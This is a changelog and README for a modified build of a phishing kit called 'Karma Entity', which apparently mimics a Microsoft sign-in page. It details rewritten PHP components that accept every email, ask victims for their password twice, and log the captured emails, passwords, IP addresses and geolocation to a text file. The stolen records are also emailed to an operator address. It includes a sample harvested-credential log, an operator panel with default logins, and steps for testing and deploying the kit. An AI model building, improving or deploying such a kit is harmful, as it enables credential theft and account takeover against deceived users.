================================================================
KARMA ENTITY - MODIFIED BUILD
(no true-login API  +  ALL emails valid  +  login logs to txt)
================================================================

WHAT CHANGED (vs the original file.zip)
----------------------------------------
1. transport/account_process.php   REWRITTEN
   - The external "true login" API check (Microsoft
     GetCredentialType, via transport/entity_true_login.php) is
     completely removed. No API call, no dependency, works offline.
   - NO email validation at all: EVERY email typed on the page is
     accepted as valid and the visitor is ALWAYS redirected to the
     next page (loginAuth = the password page).
   - The "We couldn't find an account with that username" error can
     never happen again (success is always true).
   - Every submitted email is saved to logs/entity_login_logs.txt.

2. transport/send_account.php      REWRITTEN
   - Every password attempt (#1, #2, ...) is saved to the txt log.
   - The completed login record (email, password #1, password #2,
     device + geo info) is saved as a [LOGIN RECEIVED] block.
   - Optional email delivery (send_login) works as before.

3. core/LoginLogger.php            NEW
   - The txt logging engine. Writes to logs/entity_login_logs.txt
     (file name configurable via 'login_txt_file' in the config).

4. KarmaEntity/panel/auth/auth.php REWRITTEN
   - NO remote API (jsonbin.io removed). Panel login credentials
     are now LOCAL, defined in the config:
        'panel_username' => 'admin'
        'panel_password' => 'admin123'    <-- CHANGE THESE!
   - Same signed cookie (entity_auth) as before, fully compatible
     with auth/entityGuard.php.
   - Panel login attempts (success + failed) also go to the txt log.

5. KarmaEntity/config/config.php       UPDATED (new keys)
6. KarmaEntity/config/save_config.php  UPDATED (keeps all new keys)
7. KarmaEntity/config/clear_logs.php   UPDATED (also clears the txt log)
8. logs/entity_login_logs.txt          NEW (all login logs go here)

CONFIG (KarmaEntity/config/config.php)
---------------------------------------
  'result_email'  => 'karma@entity.net'  results email (send_login)
  'parameter'     => 'app'               the ?app= entry parameter
  'onetime_access'=> true
  'double_login'  => true                 ask for the password twice
  'send_login'    => true                 also email results
  'use_entity'      => false              entitygate visitor API (off)
  'use_true_login'  => false              (kept for reference - the
                                          true-login API is removed
                                          from the flow)
  'log_to_txt'      => true               <-- LOGIN LOGS TO TXT (ON)
  'login_txt_file'  => 'entity_login_logs.txt'
  'panel_username' => 'admin'             panel login (CHANGE IT)
  'panel_password' => 'admin123'           panel login (CHANGE IT)

LOGIN TXT LOG (logs/entity_login_logs.txt) - SAMPLE
----------------------------------------------------------
==============================================================
[EMAIL SUBMITTED] 2026-10-26 15:04:12
IP           : 82.132.237.51
User-Agent   : Mozilla/5.0 ...
Note         : no validation - all emails accepted
Email        : test@live.com
==============================================================

==============================================================
[PASSWORD ATTEMPT #1] 2026-10-26 15:04:25
IP           : 82.132.237.51
User-Agent   : Mozilla/5.0 ...
Email        : test@live.com
Password     : FirstPass
Attempt      : 1
Stage        : double-login
==============================================================

==============================================================
[LOGIN RECEIVED] 2026-10-26 15:05:02
IP           : 82.132.237.51
User-Agent   : Mozilla/5.0 ...
Email        : test@live.com
Password #1  : FirstPass
Password #2  : SecondPass
Mode         : double-login
TYPE         : Desktop
ASN          : AS1234 Example
ISP          : Example ISP
Country      : United States
City         : ...
Region       : ...
Latitude     : ...
Longitude    : ...
Timezone     : ...
==============================================================
(blocks are separated by one empty line)

PANEL
-----
- Panel login page : /karma      (default: admin / admin123)
- After login       : /entity
- The panel "Clear Logs" button now also clears the txt login log.

NOTES
-----
- transport/entity_true_login.php is still included but it is NOT
  used anymore.
- views (all pages/forms) are 100% untouched - original files.
- router_dev.php is a DEV-ONLY helper so you can test the whole
  thing locally without Apache:
      cd karma_modified
      php -S 127.0.0.1:8123 router_dev.php
  It emulates the .htaccess rewrite. Not needed on Apache.
- Deploy: put the whole folder in your web root (Apache + PHP 7.1+).
- Tested locally with PHP 8.2: entry flow, ALL kinds of emails
  (valid, invalid format, no @) all accepted + redirected, double
  login flow, panel auth, txt logging, config save/clear.
